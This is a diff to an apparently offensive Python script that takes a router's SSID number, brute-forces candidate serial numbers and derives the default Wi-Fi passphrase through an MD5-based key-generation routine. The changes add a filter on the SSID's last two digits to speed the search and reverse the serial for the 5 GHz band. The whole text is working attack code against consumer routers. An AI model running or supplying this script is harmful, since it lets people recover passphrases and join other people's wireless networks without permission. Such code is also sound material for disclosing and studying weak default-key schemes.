@@ -8,6 +8,7 @@ if len(sys.argv) < 2:
     print('Usage:', sys.argv[0], '123456')
     exit(1)
 
+last_two_digits_of_target = int(sys.argv[1][-2:])
 target = int(sys.argv[1])
 
 print("[*] Target is", target)
@@ -26,8 +27,13 @@ def create_ssid(s1, s2, s3, s4, magic):
     return b - (((b * magic2) >> 54) - (b >> 31)) * 10000000
 
 def generate_passphrase(serial, type):
+    new_serial = serial 
+
+    if (type == '5'):
+        new_serial = serial = serial[::-1]
+
     m = hashlib.md5()
-    m.update(serial.encode('utf-8'))
+    m.update(new_serial.encode('utf-8'))
 
     intlist = int.from_bytes(m.digest(), 'little')
 
@@ -52,7 +58,7 @@ def generate_passphrase(serial, type):
     m.update(combined_hashes.encode('utf-8'))
     passphrase = convert_hash_to_pass(m.digest())
 
-    print('[*] Found passphrase for', type, 'GHZ', serial, 'passphrase =', passphrase)
+    print('[*] Found passphrase for', type, 'GHZ', new_serial, 'passphrase =', passphrase)
 
 def mangle(d1, d2, d3, d4):
     a = ((d4 * magic1) >> 40) - (d4 >> 31)
@@ -97,4 +103,6 @@ for s1 in range(0,9):
     for s2 in range(0,99):
         for s3 in range(0,9):
             for s4 in range(0,9999):
-                check(s1,s2,s3,s4)
+                # are the last 2 digits the same as the last 2 digits on the SSID
+                if (s4 - last_two_digits_of_target) % 100 == 0:
+                    check(s1, s2, s3, s4)
